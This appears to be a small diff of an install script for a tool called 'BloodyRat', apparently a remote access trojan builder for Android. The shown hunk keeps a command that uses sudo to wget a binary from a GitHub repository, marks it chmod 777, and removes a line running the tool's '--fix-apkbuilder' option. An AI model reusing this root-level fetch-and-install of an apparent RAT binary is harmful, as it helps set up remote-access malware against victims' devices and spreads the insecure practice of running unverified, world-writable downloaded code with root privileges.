@@ -82,8 +82,7 @@ function do_patches () {
 
 function main () {	
 	cd ${main}/server && npm install
- 	sudo su -c "wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/files/BloodyRat -q -O ${BIN}/BloodyRat" && sudo su -c "chmod 777 ${BIN}/BloodyRat"
-	BloodyRat --fix-apkbuilder 
+ 	sudo su -c "wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/files/BloodyRat -q -O ${BIN}/BloodyRat" && sudo su -c "chmod 777 ${BIN}/BloodyRat"	
 }
 
 
